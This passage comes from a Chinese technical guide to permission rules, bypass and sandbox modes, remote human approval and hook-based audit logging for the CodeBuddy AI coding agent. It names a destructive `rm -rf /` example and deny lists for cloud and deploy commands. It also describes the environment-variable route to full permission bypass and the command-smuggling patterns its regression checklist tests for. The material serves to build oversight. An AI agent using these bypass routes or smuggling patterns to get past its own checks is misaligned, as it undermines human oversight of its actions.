要点：`-y` 单独用时 HIGH/CRITICAL 仍会问；只有配合 `CODEBUDDY_IS_SANDBOX=1` 才是 full pass。企业侧要禁掉这条路径用 `permissions.disableBypassPermissionsMode: "disable"`（同时阻止 `CODEBUDDY_IS_SANDBOX` 打开 full pass）。

**场景 5：团队共享基线 + 个人放宽**

| 层 | 文件 | 放什么 |
| :--- | :--- | :--- |
| 团队基线 | `.codebuddy/settings.json` | 只放 `deny`（任一作用域 deny 即拒，最可靠） |
| 个人放宽 | `.codebuddy/settings.local.json` | 放 `allow`（不进 git） |
| 个人安全底线 | `~/.codebuddy/settings.json` | `deny` + `defaultMode` —— **权限来源里 user 高于 project**，仓库改不动你的底线 |

**场景 6：子代理收紧**

```json
{ "permissions": { "subagentPermissionMode": "default" } }
```

要点：主会话可以宽松，但子代理（尤其是团队成员并发跑）统一走 `default`。注意 `Agent` 工具的 `mode` 入参优先级更高；插件 agent 不能自带 `permissionMode`。

---

### 12.5 怎么"测"：没有官方断言工具，用这三招

官方没有提供权限规则的单元测试/dry-run 命令。可用的验证手段：

**① `/permissions` 面板 —— 唯一能看"规则来自哪一层"的地方**

打开后可查看当前全部 allow/ask/deny 及其来源作用域。**F5/F6/F7/F8 这类静默失效的 MCP 规则，只能靠这里核对。**

**② `dontAsk` 模式 + headless 做二元断言（本文推论，非官方方法）**

`dontAsk` 会把最终的 `ask` 改写为 `deny`（阶段❾），于是结果只有"执行"和"拒绝"两种，适合脚本化回归：

```bash
# 期望 ✅：命中 allow
codebuddy -p '执行 npm test' --permission-mode dontAsk --settings '{"permissions":{"allow":["Bash(npm test)"]}}'
# 期望 ❌：未命中，应被拒绝
codebuddy -p '执行 npm run deploy' --permission-mode dontAsk --settings '{"permissions":{"allow":["Bash(npm test)"]}}'
```

用 `--settings '{...}'` 传进程级配置，不污染仓库文件；配合 `--setting-sources user` 排除干扰层。⚠️ 这是从文档语义推导的方法，首次使用请人工核对结果再纳入 CI。

**③ `PreToolUse` hook 当探针，把判定过程落盘**

hook 在阶段⓿，能拿到 `tool_name` + `tool_input`，用它记录"模型实际尝试了什么命令"——这是发现绕过写法（变量替换、多余空格）的最有效手段：

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "jq -c '{ts:now, cmd:.tool_input.command, agent:.agent_type}' >> \"$CODEBUDDY_PROJECT_DIR\"/.perm-audit.jsonl"
      }]
    }]
  }
}
```

注意 hook 只能观测到"模型想干什么"，看不到权限链的最终裁决；要观测裁决结果需结合 `PermissionRequest` / `PermissionDenied` 事件。

**回归清单（每次改权限配置后至少过一遍）**：B2（复合命令不被夹带）、C1（重定向不被通配符放行）、D8（沙箱是否兜住间接写）、F7（MCP 是否真禁掉）、H1（deny 是否压住 allow）、H7（CI 下 ask 是否变 deny）、H11（是否有 hook 在偷偷 allow）。

---

## 13. 红线人工审批（Human-in-the-loop）：谁来审、审完怎么留痕

### 13.1 结论速览

| 问题 | 答案 |
| :--- | :--- |
| 有内置审批能力吗？ | ✅ 有三条路径：内置审批弹框、Channel 远程审批中继、SDK 编程式接管 |
| 默认谁来审？ | **终端前的那个人**（工具审批弹框） |
| 能让别人审吗？ | ✅ 能——通过 Channel 权限中继，企微/微信/Telegram 白名单成员可远程审批 |
| 有双人复核 / 角色分离 / 指定审批人吗？ | ❌ **官方文档未提供**。权限系统基于"规则 + 模式"，不基于审批人身份 |
| 审批结果自动留痕吗？ | ⚠️ 会话 transcript 自动落盘，但**"权限决策是否结构化记录"文档未明确**；要可靠审计**必须自己用 hook 落盘** |

---

### 13.2 触发人审的 5 种方式（按可控性排序）

| # | 方式 | 配置 | 审批人看到什么 | 主体 |
| :-- | :--- | :--- | :--- | :--- |
| 1 | **`ask` 规则** | `permissions.ask: ["Bash(git push:*)"]` | 标准审批弹框 | J/L/U |
| 2 | **`PreToolUse` hook 返回 `ask`** | `{"permissionDecision":"ask","permissionDecisionReason":"触发红线：修改生产配置"}` | **`permissionDecisionReason` 显示在弹框里** ← 这是唯一能自定义红线提示文案的地方 | **P ✅** |
| 3 | **命令安全检查（内置）** | 无需配置 | HIGH/CRITICAL 危险命令强制 ask，连 `bypassPermissions` 下 `rm -rf /` 也会问 | 产品内置 |
| 4 | **`plan` 模式 + `ExitPlanMode`** | `--permission-mode plan` | 先出方案，落手改动前要人确认 | C |
| 5 | **`AskUserQuestion` 工具** | 模型主动调用 | 结构化选项让人选 | 产品内置 |

**做红线审批就用第 2 种**——它是唯一能带上"为什么拦你"的方式：

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash|Write|Edit",
      "hooks": [{
        "type": "command",
        "command": "${CODEBUDDY_PLUGIN_ROOT}/scripts/redline-gate.sh"
      }]
    }]
  }
}
```

脚本判定命中红线后输出：

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "ask",
    "permissionDecisionReason": "【红线】该操作将修改生产环境配置 config/prod.yaml，需人工确认。审批记录将写入 .codebuddy-audit.jsonl"
  }
}
```

> ⚠️ **注意 `type: "prompt"` 的 hook 只能返回 `{ok, reason}` 二态**，表达不了"转人审"。要 ask 必须用 `command`（或 `agent`）类型返回结构化 `permissionDecision`。

---

### 13.3 谁来审：把审批人从"本机用户"扩展出去

#### 路径 A：Channel 权限中继（唯一的内置远程审批）

MCP channel server 在 capabilities 声明 `"claude/channel/permission": {}` 即可接管审批。

| 环节 | 消息 / 字段 |
| :--- | :--- |
| 发起 | `notifications/claude/channel/permission_request`：`request_id`（5 个小写字母，排除 `l`）、`tool_name`、`description`、`input_preview`（工具参数 JSON，截断 200 字符） |
| 裁决 | `notifications/claude/channel/permission`：`request_id` + `behavior`（`allow` / `deny`） |
| 自然语言回复 | 正则 `/^\s*(y\|yes\|n\|no)\s+([a-km-z]{5})\s*$/i` → 即回复 `y <id>` / `n <id>` |
| 退出计划模式 | 回复 `q`（`deny_and_exit_plan`，出自 v2.97.0 release notes） |
| 并发裁决 | **先到生效**：本地终端与远程 channel 同时打开时，先回答的生效，另一侧自动关闭 |

已支持的承载：

| 渠道 | 接入方式 | 审批人由谁决定 |
| :--- | :--- | :--- |
| 企业微信 | WebSocket 长连接，无需公网 IP；凭证 `CODEBUDDY_WECOM_BOT_ID` / `CODEBUDDY_WECOM_BOT_SECRET`（私有化可配 `CODEBUDDY_WECOM_BOT_WS_URL`） | Bot 可见范围 + 白名单 |
| 微信 | 内置 channel，ClawBot 扫码绑定；凭证 `~/.codebuddy/channels/wechat/credentials.json`（权限 600） | **发送者白名单** |
| Telegram / Discord | 插件实现，配对流程加白名单 | 白名单 |
| Web UI / ACP / IDE | 浏览器或 IDE 内弹框 | 打开界面的人 |

企微交互细节：竖排投票卡（`vote_interaction`），**5 秒内置灰**；消息回调需 **5 秒内**回复；流式消息 6 分钟超时（安全线 5 分钟），超时回退异步推送（`aibot_send_msg`，24 小时有效）。

> 🔑 **"谁来审"的实际控制点 = 渠道白名单**。这是目前最接近"指定审批人"的机制，但它是**渠道级**的（谁在群里/白名单里都能审），不是**按操作类型分派审批人**。

#### 路径 B：SDK `canUseTool` —— 想接公司审批流就走这条

```
canUseTool(toolName, input, opts) → { behavior: 'allow' | 'deny', updatedInput?, interrupt? }
opts: tool_use_id / signal / agent_id / suggestions / blocked_path / decision_reason
```

宿主程序可以在回调里同步阻塞去调工单系统、飞书审批、企微审批实例，拿到结果再返回。**这是实现"双人复核、角色分离、指定审批人"的唯一可行位置**——产品不提供，得自己在这一层搭。

#### 路径 C：把"通知"和"裁决"分开（低成本折中）

`Notification` hook（matcher `permission_prompt`）把待审事件推到 IM/值班群，**但裁决动作仍需本机用户完成**。适合"远程提醒 + 本地放行"的场景，比搭 channel server 便宜得多。

---

### 13.4 留痕：自动有什么、缺什么、怎么补

**自动就有的：**

| 载体 | 路径 | 内容 |
| :--- | :--- | :--- |
| 会话 transcript | `~/.codebuddy/projects/<project>/<session-uuid>.jsonl`（即 hook payload 里的 `transcript_path`） | 完整对话与工具调用，JSONL |
| 全局历史 | `~/.codebuddy/history.jsonl` | 跨会话对话历史 |
| 运行日志 | `~/.codebuddy/logs/{date}/`、`~/.codebuddy/debug/`（需 `--debug`） | 按日期分目录 |
| Checkpoint | 自动跟踪工具编辑，`/rewind` 可回退 | **不跟踪 bash 副作用** |
| 保留期 | `cleanupPeriodDays`（默认 30 天，按最后活动日期） | 到期本地清理 |

**明确缺失的：**

- ❌ 没有专门的审计日志文件
- ❌ **"权限审批决策（谁批的、批了什么、何时批）是否结构化落盘"，官方文档未说明**
- ❌ OpenTelemetry 的 span 属性里**未提及**权限决策字段（`codebuddy_code.tool` span 有 `tool_name`、`tool.call_id`、`tool_input`，需 `OTEL_LOG_TOOL_DETAILS=1`；权限结果文档未提及）
- ❌ 没有企业级审计台账、日志保留策略、合规追溯说明

**所以：要合规留痕，必须自己搭。** 三个可落地的落盘点：

| 落盘点 | 能记录什么 | 局限 |
| :--- | :--- | :--- |
| `PreToolUse` hook | 模型**想做什么**（`tool_name`、`tool_input`、`agent_id`、`agent_type`、`session_id`、`permission_mode`） | 看不到最终裁决 |
| `PermissionRequest` / `PermissionDenied` hook | 审批流**被触发**、以及**被 auto 分类器拒绝** | 用户点了"允许"是否有对应事件，文档未明确 |
| `PostToolUse` / `PostToolUseFailure` hook | **实际执行了什么、结果如何** | 事后 |

> 实操推论：**用 `PreToolUse`（意图）+ `PostToolUse`（实际执行）配对比对**——出现在 Pre 但没出现在 Post 的记录，就是被拒绝/未放行的。这是在没有官方裁决事件的情况下反推审批结果的可行办法。

**另外两个补充手段：**

- `CODEBUDDY_CODE_SHELL_PREFIX`：包装所有 shell 命令的命令前缀，**文档明示可用于日志或审计**——适合在 OS 层无差别记录每条 Bash 命令，不依赖 hook。
- `type: "http"` hook：把事件 JSON 直接 POST/PUT/PATCH 到公司审计服务，避免本地文件被篡改。
- `unstable_Checkpoint` hook（SDK，实验性）：提供文件快照与变更统计，release notes 明示"便于实现自动化审计"。

---

### 13.5 最小可用方案：红线拦截 + 人审 + 留痕

**① 硬边界（不需要人审的，直接拒）**——`.codebuddy/settings.json`

```json
{
  "permissions": {
    "deny": ["Bash(kubectl:*)", "Bash(aws:*)", "Edit(.github/workflows/**)", "mcp__*"]
  },
  "sandbox": { "enabled": true }
}
```

**② 红线转人审**——插件 `hooks/hooks.json`

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash|Write|Edit",
      "hooks": [{
        "type": "command",
        "command": "${CODEBUDDY_PLUGIN_ROOT}/scripts/redline-gate.sh",
        "statusMessage": "repo-guard 红线检查中",
        "timeout": 15
      }]
    }],
    "PostToolUse": [{
      "hooks": [{
        "type": "http",
        "url": "https://audit.internal/codebuddy",
        "method": "POST"
      }]
    }]
  }
}
```

`redline-gate.sh` 命中红线时返回 `permissionDecision: "ask"` + 带上下文的 `permissionDecisionReason`，同时把意图追加写入本地审计文件。

**③ 让值班同事能审**：接企微 channel（`CODEBUDDY_WECOM_BOT_ID` / `_SECRET`），白名单只放值班人；本地终端与企微**先到生效**。

**④ 配对审计**：`PreToolUse` 写 `intent.jsonl`，`PostToolUse` 写 `executed.jsonl`，按 `session_id` + `tool_input` 配对，差集即"被拦下的操作"。

**⑤ CI 场景不要指望人审**：非交互模式下阶段❽会把未决 `ask` 转成 `deny`（`dontAsk` 更是直接改写）。CI 里的正确姿势是**让它失败并报告**，把人审挪到 PR/MR 环节，而不是让流水线挂在等审批上。
- 改了插件不改 `version` = 用户拿不到更新（缓存键）。
- 规则/记忆文件改动不热生效，需重启。

---

## 14. 研发规范落点索引

> 前面 13 章回答「CodeBuddy 有哪些控制点」；这一章回答「**我们的研发规范该落在哪个控制点上**」。
> 规范内容清单见 [`STANDARDS.md`](STANDARDS.md)，可执行配置见 `templates/standards/`。
> 主体标记沿用 §0：**P** 插件可分发 / **J** 项目级 / **C** 运行时 / **U** 用户级。

### 14.1 四份配置各管什么（都不迁移）

| 配置文件 | 管什么 | 谁维护 | 主体 |
| :--- | :--- | :--- | :--- |
| `.codebuddy/repo-facts.json` | **事实**：`publicLayer` / `lineLimit` / `componentLibrary` / `analyzer`。从图谱推出来、人确认 | `repo-guard init --write` 生成，人过一眼 | **J** |
| `.codebuddy/redlines.json` | **红线意图**：`rules[].protects` / `paths` / `contentMatchers`。代码里读不出来的知识 | 人手写 | **J** |
| `.codebuddy/guard/` | **七道门总闸与流程配置**：注入面、准入、循环、交付、复述 | `repo-guard guard init --write` 铺骨架 | **J** |
| `.codebuddy/standards/` | **研发规范**：五端标准、门禁、红线正文 | `repo-guard standards init --write` 铺模板 | **J**（全局层在插件里 = **P**） |

两层规范的物理位置：

```
templates/standards/*.json          全局层（部门规范）→ 随插件版本走，主体 P
<repo>/.codebuddy/standards/*.json  项目层（团队共识）→ 进 git，主体 J
```

合并按条目 `id`，字段级浅合并。项目层放宽（降级 / `enabled:false`）必须写 `override_reason`，否则 override 被忽略。

> ⚠️ 全局层是**只读默认值**。插件安装后缓存在 `~/.codebuddy/plugins/cache/<市场>/<插件>/<版本>/`（见 §7），升级换目录，所以不要指望在安装后的副本里改 —— 要改就改插件源码仓，或者用项目层覆盖。

> ⚠️ **只有项目层存在时，规范才驱动运行时行为。** 全局层装上插件就存在，拿它驱动注入意味着所有人一升级插件就被迫接受一堆新输出。所以 `evaluate.ts` 的每个入口都先过 `isActionable()`，而它只认 `projectPresent`。没铺 `.codebuddy/standards/` = 零行为变化（`verify-hooks` 的 59 条用例就跑在这个前提上），此时全局层只用于 `standards check` 这类人主动跑的 CLI 自查。

### 14.2 规范 → 控制点映射

`severity` 决定用哪个控制点，`check.kind` 决定判得准不准：

| severity | 控制点 | Hook 事件 | 输出字段 | 权限链位置 |
| :--- | :--- | :--- | :--- | :--- |
| `inject` | 上下文注入（§2） | `SessionStart` / `PostCompact` | `hookSpecificOutput.additionalContext` | 不参与 |
| `inject`（按任务） | 上下文注入 | `UserPromptSubmit` | `additionalContext` | 不参与 |
| `remind` | 工具后注入（§2） | `PostToolUse` | `additionalContext` | 不参与 |
| `ask` | 红线人工审批（§13.2 方式 2） | `PreToolUse` | `permissionDecision: "ask"` + `permissionDecisionReason` | **阶段 0** |
| `block` | 事件拦截（§3.6） | `PreToolUse` | `permissionDecision: "deny"` | **阶段 0** |

**注入面只给 `title`，正文留到两个时刻才给**：`UserPromptSubmit` 按 `tags` 命中时（这一句话确实相关）、以及被拦/被提醒时（此刻它必须知道为什么）。45 条规范的正文加起来远超 1500 token 的段预算，会话开始时模型需要的是"知道有这些约束"，不是背下每条。

**standards 的 `block` 不受 guard 的 `L1_admission` 总闸控制。** 它有自己的总闸（`standards.json` 的 `enabled` + `maxSeverity`）—— 把 `maxSeverity` 调到 `block` 已经是极其明确的表态，再要求同时打开 guard 的 L1 就成了两套开关，人会困惑「我开了为什么不拦」。实现上 `judgeRedline` 的 `extraRules` 参数走独立闸门（`src/gates/admission.ts`）。

**`PreToolUse` 的判定顺序里，公共层守卫排在 standards 的 `require_tool` 之前。** 两者可能判同一件事（模板 `CM-LAYER-002` 的 paths 就是公共层），而核心功能那份拒绝文案是真机调优过的：它给出三种工具调法（MCP 全名 / 斜杠命令 / CLI 绝对路径），因为模型按 `impact` 去搜工具名会搜不到，然后判定「工具不存在」改用 grep 凑影响面。让 standards 那份较简的文案抢在前面等于丢掉这个调优成果。

`check.kind` → 判定数据源：

| `check.kind` | 数据源 | 能 `block` 吗 |
| :--- | :--- | :--- |
| `none` | — | ❌ |
| `path_only` | 条目 `paths` glob | ✅ |
| `protect_symbol` | `redlines.json` 的 `protects` + 红线引擎真 diff | ✅ |
| `content_regex` | 条目 `patterns[]` | ❌ **永不**（正则判不出意图） |
| `require_tool` | `$HOME/.repo-guard/state/<repo-id>.json` 的「本轮查过哪些文件」 | ✅ |
| `require_evidence` | 会话内 Bash 命令记录（`guard/process/delivery.json` 的 `evidencePatterns`） | ❌ |

### 14.3 端 → 规范文件 → 时机

| 端 | 文件 | 主要时机 | 能硬拦的条目 |
| :--- | :--- | :--- | :--- |
| L0 跨端契约 | `l0-contract.json` | `session_start` | 无（契约的另一端不在本仓） |
| 全端共用 | `common.json` | `session_start` / `post_write` / `stop` | `CM-LAYER-002`、`CM-FREEZE-001` |
| 前端 Web/React | `frontend-web.json` | `session_start` / `post_write` | `FE-LIB-003`、`FE-LIB-002`（默认关） |
| 后端 Go/Node/Java | `backend-service.json` | `session_start` / `pre_write` / `post_write` | `BE-API-003`、`BE-API-002`（默认关）、`BE-CONF-001`（默认关） |
| 数据库 | `database.json` | `session_start` / `post_write` | `DB-RL-001`（默认关，需填 symbols） |
| 消息队列 | `message-queue.json` | `session_start` | `MQ-RL-001`（默认关，需填 symbols） |

**注入预算**：每段 1500 token（§2 的 `SEGMENT_MAX_TOKENS`），五端全量必超。解法是按端裁剪 —— `standards.json` 的 `stacks` 用 `auto` 时由 `repo-facts.analyzer` + `stackDetect` 目录特征探测，只注入命中端；`UserPromptSubmit` 再按条目 `tags` 补该端正文。

### 14.4 插件拦不住的，交给谁

这张表是 §11 选型决策表在「研发规范」这个场景下的具体化。**不假装能拦**是底线：

| 规范 | 为什么插件拦不住 | 落点 | 具体配置 | 主体 |
| :--- | :--- | :--- | :--- | :--- |
| `CM-CODE-002` 循环依赖 | 需要全量图 + 增量判定，超出 hook 时间预算 | lint | `import/no-cycle`、golangci-lint | J |
| `CM-CODE-001` 行数硬拦 | 存量超长文件遍地，硬拦等于没法干活 | lint | `max-lines`（新文件严、存量放宽） | J |
| `FE-I18N-001` i18n | AST 级判定；正则会把注释与测试算进去 | lint | eslint i18n 插件 | J |
| `FE-TYPE-001` 禁 `any` | 同上 | lint + CI | `tsc --strict` + `no-explicit-any` | J |
| `CM-SEC-001` 密钥 | 真正的判定要熵检测 + 历史扫描 | CI | secret scan + pre-commit | J |
| `CM-SEC-002` 碰生产 | 插件 deny 是黑盒，`/permissions` 面板里审计不到（§3.6） | **宿主 permissions** | `"ask": ["Bash(kubectl:*)", "Bash(mysql:*)", "Bash(aws:*)"]` | **J/L/U** |
| `CM-VCS-001` 提交门禁 | `git commit` 是人随时会敲的动作，`Stop` 上硬拦直接妨碍人 | **宿主 permissions** | `"ask": ["Bash(git commit:*)", "Bash(git push:*)"]` | **J/L/U** |
| `L0-EN-002` 契约 diff | 需要对端契约，跨仓 | CI | 契约 diff 流水线 | — |
| `L0-EN-003` 覆盖率门禁 | 唯一能卡住合并的地方是流水线 | CI | — | — |
| `L0-EN-004` MR 模板 / CODEOWNERS | 平台能力 | 代码平台 | — | — |
| `MQ-SCHEMA-002` 生产者消费者同步发布 | 另一端在别的仓库 | CI + human | 契约 diff + MR 描述 | — |

一句话：**确定性规则归 lint，阻断合并归 CI，安全边界归宿主 `permissions`，过程中的「你现在要动的东西很贵」归插件。**

### 14.5 为什么图里的 4 个门禁名没有变成 4 道门

外部规范图里出现过 `modify_api` / `modify_database` / `modify_mq_schema` / `modify_component` 四个门禁名，以及 `verification.buildCmd` / `verification.testCoverageNote`、`publicLayerPatterns` / `pageLayerPatterns` 等字段。这些是**另一套系统的字段名**，本工程不引入，而是落成 standards 条目复用现有机制：

| 图里的名字 | 本工程落点 |
| :--- | :--- |
| `modify_api` | `BE-API-002`（`protect_symbol`）+ `BE-API-003`（`require_tool: impact`） |
| `modify_database` | `DB-*` 条目，`path_only` + `remind`。**刻意不强制查图谱** —— 库字段的「影响面 0」是假信号（SQL、离线任务、其它服务都在图外） |
| `modify_mq_schema` | `MQ-RL-001`（`protect_symbol`）；同步发布跨仓 → `landing: ['ci','human']` |
| `modify_component` | `FE-LIB-002`（`require_tool: lib_search`）+ `FE-LIB-003`（`require_tool: impact`），复用已实现的 `guard/process/graph-enforce.json` |
| `verification.buildCmd` / `testCoverageNote` | `check.kind: 'require_evidence'` + `commands[]`，判定走 `guard/process/delivery.json` 的 `evidencePatterns`；覆盖率缺口写进条目 `hint` |
| `publicLayerPatterns` / `pageLayerPatterns` | `repo-facts.publicLayer`（已有）+ 条目自己的 `paths`。不引入第二套路径字段 —— 两套必然打架 |

**`block` 级不写第二套判定逻辑**：编译成 `PolicyRule`（id 加 `STD-` 前缀）并入红线快照，复用现成的红线引擎。引擎的误报率是在真实仓库上调出来的，另写一套必然漂。
